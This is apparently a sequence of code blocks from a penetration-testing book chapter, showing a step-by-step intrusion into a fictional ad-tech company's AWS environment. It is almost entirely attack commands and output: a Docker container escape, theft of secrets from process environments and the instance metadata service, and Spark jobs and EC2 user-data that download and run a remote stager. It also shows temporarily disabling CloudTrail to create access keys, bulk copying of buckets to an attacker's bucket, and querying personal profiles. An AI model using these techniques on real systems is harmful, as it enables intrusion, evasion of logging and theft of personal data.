["```\nmeterpreter > **shell**\nChannel 1 created.\n\n# **id**\n1 uid=0(root) gid=0(root) groups=0(root)\n\n# **hostname**\n2 e56951c17be0\n```", "```\n# **env**\nHOSTNAME=cef681151504\nGOPATH=/go\nPWD=/go\nGOLANG_VERSION=1.13.5\n# **mount**\n/dev/mapper/ubuntu--vg-root on /etc/hosts type ext4\n(rw,relatime,errors=remount-ro,data=ordered)\n\n1 tmpfs on /var/run/docker.sock type tmpfs\n(rw,nosuid,noexec,relatime,size=404644k,mode=755)\n\n/dev/mapper/ubuntu--vg-root on /usr/bin/docker type ext4\n(rw,relatime,errors=remount-ro,data=ordered)\n\n# **apt install -y curl**\n# **curl 169.254.169.254/latest/meta-data/iam/security-credentials/**\n2 ...<title>404 - Not Found</title>...\n```", "```\n# **docker ps**\nCONTAINER ID   IMAGE\n1 e56951c17be0   983457354409.dkr.ecr.eu-west-1.amazonaws.com/\n               app-abtest:SUP6541-add-feature-network\n\n7f6eb2ec2565   983457354409.dkr.ecr.eu-west-1.amazonaws.com/datavalley:master\n\n8cbc10012935   983457354409.dkr.ecr.eu-west-1.amazonaws.com/libpredict:master\n`--snip--`\n```", "```\n# **docker info**\nName: jenkins-slave-4\nTotal Memory: 31.859GiB\nOperating System: Ubuntu 16.04.6 LTS\nServer:\nContainers: 546\nRunning: 12\n`--snip--`\n```", "```\n# **docker run \\**\n**--privileged \\**\n1 **-v /:/hostOS \\**\n**-v /var/run/docker.sock:/var/run/docker.sock \\**\n**-v /usr/bin/docker:/usr/bin/docker \\**\n**-d 886477354405.dkr.ecr.eu-west-1.amazonaws.com/aws-cli**\n```", "```\nmeterpreter > **ls /hostOS**\nbin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found  media  mnt\nopt  proc  root  run...\n```", "```\nshell> **ps -ed -o user,pid,cmd | grep \"jenkins\"**\njenkins   1012   /lib/systemd/systemd –user\njenkins   1013   sshd: jenkins@notty\nJenkins   1276   java -XX:MaxPermSize=256m -jar remoting.jar...\njenkins   30737  docker run --rm -i -p 9876:9876 -v /var/lib/...\n`--snip--`\n```", "```\nshell> **ps -ed -o user,pid,cmd \\**\n**| grep \"jenkins\" \\**\n**| awk '{print $2}' \\**\n**> listpids.txt**\n```", "```\nshell> **while read p; do \\**\n**cat /hostOS/proc/$p/environ >> results.txt; \\**\n**done <listpids.txt**\n```", "```\nroot@Point1:~/#  **cat results.txt**\nghprbPullId = 1068\nSANDBOX_PRIVATE_KEY_PATH = /var/lib/jenkins/sandbox\nDBEXP_PROD_USER = pgsql_exp\nDBEXP_PROD_PAS  = vDoMue8%12N97\nMETAMARKET_TOKEN = 1$4Xq3_rwn14gJKmkyn0Hho8p6peSZ2UGIvs...\nDASHBOARD_PROD_PASSWORD = 4hXqulCghprbIU24745\nSPARK_MASTER = 10.50.12.67\nActualCommitAuthorEmail = Elain.ghaber@gretschpolitico.com\nBINTRAY_API_KEY = 557d459a1e9ac79a1da57$fbee88acdeacsq7S\nGITHUB_API = 8e24ffcc0eeddee673ffa0ce5433ffcee7ace561\nECR_AWS_ID = AKIA76ZRK7X1QSRZ4H2P\nECR_AWS_ID = ZO5c0TQQ/5zNoEkRE99pdlnY6anhgz2s30GJ+zgb\n`--snip--`\n```", "```\nroot@Point1:~/#  **aws ecr describe-repositories \\**\n**--region=eu-west-1 \\**\n**--profile gretsch1**\n\n\"repositoryName\": \"lib-prediction\",\n\"repositoryName\": \"service-geoloc\",\n\"repositoryName\": \"cookie-matching\",\n`--snip--`\n\nroot@Point1:~/#  **aws ec2 describe-instances --profile gretsch1**\nAn error occurred (UnauthorizedOperation)...\n\nroot@Point1:~/#  **aws s3api list-buckets --profile gretsch1**\nAn error occurred (UnauthorizedOperation)...\n\nroot@Point1:~/#  **aws iam get-user --profile gretsch1**\nAn error occurred (AccessDenied)...\n```", "```\nSPARK_MASTER = 10.50.12.67\n```", "```\nmeterpreter > **background**\n\nmsf exploit(multi/handler) > **route add 10.0.0.0 255.0.0.0 12**\n[*]  Route added\n```", "```\nmsf exploit(multi/handler) > **use auxiliary/scanner/portscan/tcp**\nmsf exploit(scanner/portscan/tcp) > **set RHOSTS 10.50.12.67**\nmsf exploit(scanner/portscan/tcp) > **set PORTS 7077**\nmsf exploit(scanner/portscan/tcp) > **run**\n\n[+] 192.168.1.24:         - 192.168.1.24:7077 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n```", "```\n$ **python -m pip install pyspark**\n```", "```\nfrom pyspark import SparkContext, SparkConf\n\n# Set up configuration options\nconf = SparkConf()\nconf = conf.setAppName(\"Word Count\")\n\n# Add the IP of the Spark master\nconf = conf.setMaster(\"spark://10.50.12.67:7077\")\n\n# Add the IP of the Jenkins worker we are currently on\nconf = conf.set(\"spark.driver.host\", \"10.33.57.66\")\n\n# Initialize the Spark context with the necessary info to reach the master\n1 sc = SparkContext(conf = conf)\n```", "```\npartList = sc.parallelize(range(0, 10))\n```", "```\ndef addTen(x):\n    return x+10\nplusTenList = partList.map(addOne)\n```", "```\nfrom pyspark import SparkContext, SparkConf\nfrom subprocess import Popen\n\nconf = SparkConf()\nconf = conf.setMaster(\"spark://10.50.12.67:7077\")\nconf = conf.set(\"spark.driver.host\", \"10.33.57.66\")\n\nsc = SparkContext(conf = conf)\npartList = sc.parallelize(range(0, 10))\nprint(Popen([\"hostname\"], stdout=subprocess.PIPE).stdout.read())\n\n$ **python test_app.py**\n891451c36e6b\n\n$ **hostname**\n891451c36e6b\n```", "```\nfrom pyspark import SparkContext, SparkConf\n--`snip`--\npartList = sc.parallelize(range(0, 10))\nPopen([\"hostname\"], stdout=subprocess.PIPE).stdout.read()\n\nfor a in finalList.collect():\n    print(a)\n```", "```\nfrom pyspark import SparkContext, SparkConf\nfrom subprocess import Popen\n\nconf = SparkConf()\nconf = conf.setAppName(\"Word Count\")\nconf = conf.setMaster(\"spark://10.50.12.67:7077\")\nconf = conf.set(\"spark.driver.host\", \"10.33.57.66\")\n\nsc = SparkContext(conf = conf)\npartList = sc.parallelize(range(0, 1))\nfinalList = partList.map(\n1     lambda x: Popen([\"hostname\"], stdout=subprocess.PIPE).stdout.read()\n)\nfor a in finalList.collect():\n    print(a)\n```", "```\n$ **python test_app.py**\n19/12/20 18:48:46 WARN NativeCodeLoader: Unable to load native-hadoop library for your\nplatform... using builtin-java classes where applicable\n\nUsing Spark's default log4j profile: org/apache/spark/log4j-defaults.properties\n\nSetting default log level to \"WARN\".\nTo adjust logging level use sc.setLogLevel(newLevel). For SparkR, use setLogLevel(newLevel).\n\nip-172-31-29-239\n```", "```\npartList = sc.parallelize(range(0, 10), 10)\n```", "```\n`--snip--`\nfinalList = partList.map(\n    lambda x: subprocess.Popen(\n        \"wget https://gretsch-spark-eu.s3.amazonaws.com/stager &&  chmod +x         ./stager && ./stager &\",\n        shell=True,\n        preexec_fn=os.setpgrp,\n    )\n)\nfinalList.collect()\ntime.sleep(10)\n\n$ **python reverse_app.py**\n`--snip--`\n```", "```\n[*] https://0.0.0.0:443 handling request from...\n[*] https://0.0.0.0:443 handling request from...\nmsf exploit(multi/handler) > **sessions -i 7**\n[*] Starting interaction with 7...\n\nmeterpreter > **execute -i -f id**\nProcess 4638 created.\nChannel 1 created.\n\n1 uid=1000(spark) gid=1000(spark)\ngroups=1000(spark),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),\n110(lxd),115(lpadmin),116(sambashare)...\n```", "```\nmeterpreter > **execute -i -H -f curl -a \\**\n**http://169.254.169.254/latest/meta-data/iam/security-credentials**\n\nspark-standalone.ec2\n\nmeterpreter > **execute -i -H -f curl -a \\**\n**http://169.254.169.254/latest/meta-data/iam/security-credentials/spark-\\**\n**standalone.ec2**\n\"AccessKeyId\" : \"ASIA44ZRK6WSS6D36V45\",\n\"SecretAccessKey\" : \"x2XNGm+p0lF8H/U1cKqNpQG0xtLEQTHf1M9KqtxZ\",\n\"Token\" : \"IQoJb3JpZ2luX2VjEJL//////////wEaCWV1LXdlc3QtM...\n```", "```\nmeterpreter > **execute -i -H -f mount**\n`--snip--`\ns3fs on /home/spark/notebooks type fuse.s3fs (rw, nosuid, nodev...)\nfusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)\n`--snip--`\n```", "```\nmeterpreter > **execute -i -H -f ps -a \"-edf\"**\n`--snip--`\nspark  14067 1  1 2018  00:51:15  s3fs gretsch-notebooks /home/spark/notebooks -o iam_role\n`--snip--`\n```", "```\nroot@Point1:~/#  **aws s3api list-objects-v2 \\**\n**--bucket-name gretsch-notebooks \\**\n**--profile spark**\n\n\"Key\": \"jessie/Untitled.ipynb\",\n\"Key\": \"leslie/Conversion_Model/logistic_reg_point.ipynb\",\n\"Key\": \"marc/Experiment – Good logistics loss cache.ipynb\",\n`--snip--`\n```", "```\nroot@Point1:~/#  **aws s3 sync s3://gretsch-notebooks ./notebooks**\n\nroot@Point1:~notebooks/# **grep -R \"AKIA\" -4 ***\nyuka/Conversion_model/...  awsKeyOpt =\nSome(\\\"AKIAASJACEDYAZYWJJM6D5\\\"),\\n\",\nyuka/Conversion_model/...  awsSecretOpt =\nSome(\\\"3ceq43SGCmTYKkiZkGrF7dr0Lssxdakymtoi14OSQ\\\")\\n\",\n`--snip--`\n```", "```\nroot@Point1:~notebooks/# **egrep -R \"s3[a|n]://\" ***\n1 s3a://gretsch-finance/portfolio/exports/2019/03/ report1579446047119.csv\ns3a://gretsch-hadoop/engine/aft-perf/...\ns3a://gretsch-hadoop-us1/nj/media/engine/clickthrough/...\ns3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...\n`--snip--`\n```", "```\nroot@Point1:~/# **aws s3 sync \\**\n**s3://gretsch-finance/portfolio/exports/2020/ ./exports_20/ --profile data1**\n\nroot@Point1:~/# **ls exports_20/**\n./01/report1548892800915.csv\n./02/report1551319200454.csv\n./03/report1551578400344.csv\n./04/report1553997600119.csv\n`--snip--`\n```", "```\nroot@Point1:~/# **head ./03/report1551578400344.csv**\nannual revenue, last contact, initial contact, country, account,\nzip code, service purchased, ...\n0.15, 20191204, 20180801, FRW nation, BR, 13010, 5...\n.11, 20200103, 20170103, RPU, US, 1101, 0...\n```", "```\nroot@Point1:~notebooks/# **egrep -R \"s3[a|n]://\" ***\ns3a://gretsch-hadoop/engine/aft-perf/...\ns3a://gretsch-hadoop-us1/nj/dmp/thirdparty/segments/...\ns3a://gretsch-hadoop-eu1/de/social/profiles/mapping/...\n`--snip--`\n```", "```\nroot@Point1:~/# **aws s3api list-buckets \\**\n**--profile data1 \\**\n**--query \"Buckets[].Name\"\\| grep Hadoop**\n\ngretsch-hadoop-usw1\ngretsch-hadoop-euw1\ngretsch-hadoop-apse1\n```", "```\nroot@Point1:~/# **aws s3api list-objects-v2 \\**\n**--profile data1 \\**\n**--bucket=gretsch-hadoop-usw1 \\**\n**--max-items 1000**\n\n\"Key\": \"engine/advertiser-session/2019/06/19/15/08/user_sessions_stats.parquet\",\n\"Key\": \"engine/advertiser-session/2019/06/19/15/09/user_sessions_stats.parquet\",\n`--snip--`\n```", "```\nroot@Point1:~/# **python -m pip install parquet-cli**\nroot@Point1:~/# **parq 02/user_sessions_stats.parquet -head 100**\nuserid = c9e2b1905962fa0b344301540e615b628b4b2c9f\ninterest_segment = 4878647678\nts = 1557900000\ntime_spent = 3\nlast_ad  = 53f407233a5f0fe92bd462af6aa649fa\nlast_provider = 34\nip.geo.x = 52.31.46.2\n`--snip--`\n\nroot@Point1:~/# **parq 03/perf_stats.parquet -head 100**\nclick = 2\nreferrer = 9735842\ndeviceUID = 03108db-65f2-4d7c-b884-bb908d111400\n`--snip--`\n\nroot@Point1:~/# **parq 03/social_stats.parquet -head 100**\nsocial_segment = 61895815510\nfb_profile = 3232698\ninsta_profile = 987615915\npinterest_profile = 57928\n`--snip--`\n```", "```\nroot@Point1:~/# **aws configure set default.s3.max_concurrent_requests 1000**\nroot@Point1:~/# **aws configure set default.s3.max_queue_size 100000**\nroot@Point1:~/# **aws s3 sync s3://gretsch-hadoop/ s3://my-gretsch-hadoop**\n```", "```\nroot@Point1:~notebooks/# **egrep -R -5 \"sql|warehouse|snowflake|redshift|bigquery\" ***\n\nredshift_endpoint = \"sandbox.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com\"\n\nengine_string = \"postgresql+psycopg2://%s:%s@%s:5439/datalake\"\\\n% (\"analytics-ro\", \"test\", redshift_endpoint)\n\nengine = create_engine(engine_string)\n\nsql = \"\"\"\nselect insertion_id, ctr, cpm, ads_ratio, segmentID,...;\n\"\"\"\n`--snip--`\n```", "```\nroot@Point1:~/# **aws redshift describe-clusters \\**\n**--profile=data1 \\**\n**--region eu-west-1**\n\nAn error occurred (AccessDenied) when calling the DescribeClusters...\n```", "```\nroot@Point1:~/# **aws iam list-groups --profile=leslie**\n\"GroupName\": \"spark-s3\",\n\nroot@Point1:~/# **aws iam list-groups --profile=marc**\n\"GroupName\": \"spark-s3\",\n\nroot@Point1:~/# **aws iam list-groups --profile=camellia**\n\"GroupName\": \"spark-debug\",\n\"GroupName\": \"spark-s3\",\n\n`--snip--`\n```", "```\nroot@Point1:~/# **aws iam list-attach-group-policies --group-name spark-debug --profile=camellia**\n\n\"PolicyName\": \"AmazonEC2FullAccess\",\n\"PolicyName\": \"iam-pass-role-spark\",\n```", "```\n# get policy version\nroot@Point1:~/# **aws iam get-policy \\**\n**--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \\**\n**--profile camellia**\n\n\"DefaultVersionId\": \"v1\",\n\n# get policy content\nroot@Point1:~/# **aws iam get-policy-version \\**\n**--policy-arn arn:aws:iam::983457354409:policy/iam-pass-role \\**\n**--version v1 \\**\n**--profile camellia**\n\n\"Action\":\"iam:PassRole\",\n1 \"Resource\": \"*\"\n`--snip--`\n```", "```\nroot@Point1:~/# **aws iam list-roles --profile camellia \\**\n**| jq -r '.Roles[] | .RoleName + \", \" + \\**\n**.AssumeRolePolicyDocument.Statement[].Principal.Service' \\**\n**| grep \"ec2.amazonaws.com\"**\n`--snip--`\njenkins-cicd, ec2.amazonaws.com\njenkins-jobs, ec2.amazonaws.com\nrundeck, ec2.amazonaws.com\nspark-master, ec2.amazonaws.com\n```", "```\nroot@Point1:~/# **aws iam get-attached-role-policies \\**\n**--role-name rundeck \\**\n**--profile camellia**\n\n\"PolicyName\": \"rundeck-mono-policy\",\n\n# get policy version\nroot@Point1:~/# **aws iam get-policy --profile camellia \\**\n**--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy**\n\n\"DefaultVersionId\": \"v13\",\n\n# get policy content\nroot@Point1:~/# **aws iam get-policy-version \\**\n**--version v13 \\**\n**--profile camellia \\**\n**--policy-arn arn:aws:iam::983457354409:policy/rundeck-mono-policy**\n\n\"Action\":[\"ec2:*\", \"ecr:*\", \"iam:*\", \"rds:*\", \"redshift:*\",...]\n\"Resource\": \"*\"\n`--snip--`\n```", "```\nroot@Point1:~/# **aws ec2 describe-instances --profile camellia \\**\n**--filters 'Name=tag:Name,Values=*spark*'**\n\n`--snip--`\n\"Tags\":\n  Key: Name  Value: spark-master-streaming\n\"ImageId\": \"ami-02df9ea15c1778c9c\",\n\"InstanceType\": \"m5.xlarge\",\n\"SubnetId\": \"subnet-00580e48\",\n\"SecurityGroups\":\n  GroupName: spark-master-all, GroupId: sg-06a91d40a5d42fe04\n  GroupName: spark-worker-all, GroupId: sg-00de21bc7c864cd25\n`--snip--`\n```", "```\nroot@Point1:~/# **aws ec2 run-instances \\**\n**--image-id ami-02df9ea15c1778c9c \\**\n**--count 1 \\**\n**--instance-type m3.medium \\**\n**--iam-instance-profile rundeck \\**\n**--subnet-id subnet-00580e48 \\**\n**--security-group-ids sg-06a91d40a5d42fe04 \\**\n**--tag-specifications 'ResourceType=instance,Tags=**\n **[{Key=Name,Value=spark-worker-5739ecea19a4}]' \\**\n**--user-data file://my_user_data.sh \\**\n**--profile camellia \\**\n**--region eu-west-1**\n```", "```\n#!/bin/bash\nwget https://gretsch-spark-eu.s3.amazonaws.com/stager\nchmod +x ./stager\n./stager&\n```", "```\n[*] https://0.0.0.0:443 handling request from...\n[*] https://0.0.0.0:443 handling request from...\nmsf exploit(multi/handler) > **sessions -i 9**\n[*] Starting interaction with 9...\nmeterpreter > **execute -i -H -f curl -a \\**\n**http://169.254.169.254/latest/meta-data/iam/security-credentials/rundeck**\n\n\"AccessKeyId\" : \"ASIA44ZRK6WS36YMZOCQ\",\n\"SecretAccessKey\" : \"rX8OA+2zCNaXqHrl2awNOCyJpIwu2FQroHFyfnGn \",\n\"Token\" : \"IQoJb3JpZ2luX2VjEJr//////////wEaCWV1LXdlc3QtMSJ...\n```", "```\nroot@Point1:~/# **export AWS_PROFILE=rundeck**\nroot@Point1:~/# **export AWS_REGION=eu-west-1**\nroot@Point1:~/# **aws cloudtrail describe-trails**\n\n   \"Name\": \"aggregated\",\n   \"S3BucketName\": \"gretsch-aggreg-logs\",\n   \"IncludeGlobalServiceEvents\": true,\n   \"IsMultiRegionTrail\": true,\n   \"HomeRegion\": \"eu-west-1\",\n 1\"HasInsightSelectors\": false,\n\nroot@Point1:~/# **aws guardduty list-detectors**\n\"DetectorIds\": []\n\nroot@Point1:~/# **aws accessanalyzer list-analyzers**\n\"analyzers\": []\n```", "```\nroot@Point1:~/# **aws cloudtrail update-trail \\**\n**--name aggregated \\**\n**--no-include-global-service-events \\**\n**--no-is-multi-region**\n\nroot@Point1:~/# **aws iam list-access-keys --user-name camellia**\n\n\"AccessKeyId\": \"AKIA44ZRK6WSXNQGVUX7\",\n\"Status\": \"Active\",\n\"CreateDate\": \"2019-12-13T18:26:17Z\"\n\nroot@Point1:~/# **aws iam create-access-key --user-name camellia**\n{\n    \"AccessKey\": {\n        \"UserName\": \"camellia\",\n        \"AccessKeyId\": \"AKIA44ZRK6WSS2RB4CUX\",\n        \"SecretAccessKey\": \"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\",\n        \"CreateDate\": \"2019-12-21T18:20:04Z\"\n    }\n}\n```", "```\nroot@Point1:~/# **aws cloudtrail update-trail \\**\n**--name aggregated \\**\n**--include-global-service-events \\**\n**--is-multi-region**\n```", "```\nroot@Point1:~/# **aws redshift describe-clusters**\n\"Clusters\": [\n1 ClusterIdentifier: bi,\n    NodeType: ra3.16xlarge, NumberOfNodes: 10,\n    \"DBName\": \"datalake\"\n`--snip--`\n\nClusterIdentifier: sandbox\n    NodeType: dc2.large,  NumberOfNodes: 2,\n    \"DBName\": \"datalake\"\n`--snip--`\n\nClusterIdentifier: reporting\n    NodeType: dc2.8xlarge, NumberOfNodes: 16,\n    \"DBName\": \"datalake\"\n`--snip--`\n\nClusterIdentifier: finance, NodeType: dc2.8xlarge\n    NumberOfNodes: 24,\n    \"DBName\": \"datalake\"\n`--snip--`\n```", "```\nClusters: [\nClusterIdentifier: sandbox-test,\nNodeType: ra3.16xlarge,\nMasterUsername: root\nDBName: datalake,\nEndpoint: {\n  Address: bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com,\n  Port: 5439\n}\nVpcSecurityGroupId: sg-9f3a64e4, sg-a53f61de, sg-042c4a3f80a7e262c\n`--snip--`\n```", "```\nroot@Point1:~/# **aws ec2 describe-security-groups \\**\n**--group-ids sg-9f3a64e4 sg-a53f61de**\n\n\"IpPermissions\": [ {\n  \"ToPort\": 5439,\n  \"IpProtocol\": \"tcp\",\n  \"IpRanges\": [\n       { \"CidrIp\": \"52.210.98.176/32\" },\n       { \"CidrIp\": \"32.29.54.20/32\" },\n       { \"CidrIp\": \"10.0.0.0/8\" },\n       { \"CidrIp\": \"0.0.0.0/0\" },\n```", "```\nroot@Point1:~/# **aws get-cluster-credentials \\**\n**--db-user root \\**\n**--db-name datalake\\**\n**--cluster-identifier bi \\**\n**--duration-seconds 3600**\n\n\"DbUser\": \"IAM:root\",\n\"DbPassword\": \"AskFx8eXi0nlkMLKIxPHkvWfX0FSSeWm5gAheaQYhTCokEe\",\n\"Expiration\": \"2020-12-29T11:32:25.755Z\"\n```", "```\nroot@Point1:~/# **apt install postgresql postgresql-contrib**\nroot@Point1:~/# **PGPASSWORD='AskFx8eXi0nlkMLKIx...' \\**\n**psql \\**\n**-h bi.cdc3ssq81c3x.eu-west-1.redshift.amazonaws.com \\**\n**-U root \\**\n**-d datalake \\**\n**-p 5439**\n**-c \"SELECT tablename, columnname  FROM PG_TABLE_DEF where schemaname \\**\n**='public'\" > list_tables_columns.txt**\n```", "```\nroot@Point1:~/# **cat list_tables_columns.txt**\nprofile, id\nprofile, name\nprofile, lastname\nprofile, social_id\n`--snip--`\nsocial, id\nsocial, link\nsocial, fb_likes\nsocial, fb_interest\n`--snip--`\ntaxonomy, segment_name\ntaxonomy, id\ntaxonomy, reach\ntaxonomy, provider\n`--snip--`\ninterestgraph, id\ninterestgraph, influence_axis\ninterestgraph, action_axis\n`--snip--`\n```", "```\nSELECT p.gp_id, p.name, p.lastname, p.deviceType, p.last_loc,\nLISTAGG(a.referer), s.link, LISTAGG(s.fb_interest),\nLISTAGG(t.segment_name),\ni.action_y, i.influence_x, i.impulse_z\n\nFROM profile p\nJOIN ads a on p.ads_id = a.id\nJOIN social s on p.social_id= s.id\nJOIN taxonomy t on p.segment_id = t.id\nJOIN interestgraph i on p.graph_id = i.id\nGROUP BY p.gp_id\nLIMIT 2000\n```", "```\np.gp_id:     d41d8cd98f00b204e9800998ecf8427e\np.name:       Dima\np.lastname:   Francis\np.deviceType: iphone X\np.last_loc_x: 50.06.16.3.N\np.last_loc_y: 8.41.09.3.E\na.referer:    www.okinawa.com/orderMeal,\n              transferwise.com/90537e4b29fb87fec18e451...,\n              aljazeera.com/news/hong-kong-protest...\ns.link:        https://www.facebook.com/dima.realworld.53301\ns.fb_interest: rock, metoo, fight4Freedom, legalizeIt...\nt.segment_name:politics_leaned_left,\n               politics_manigestation_rally,\n               health_medecine_average,\n               health_chronical_pain,...\ni.influence_x: 60\ni.action_y:    95\ni.impulse_z:   15\n\n`--snip--`\n```", "```\nc.id:        357\nc.name:      IFR\nc.address:   Ruysdaelkade 51-HS\nc.city:      Amsterdam\nc.revenue:   549879.13\nc.creatives: s3://Gretsch-studio/IFR/9912575fe6a4av.mp4,...\nc.contact:   jan.vanurbin@udrc.com\np.funnels:   mxads, instagram, facebook,...\nclick_rate:  0.013\nreal_visit:  0.004\n`--snip--`\n\nunload ('<HUGE_SQL_QUERY>') to 's3://data-export-profiles/gp/'\n```"]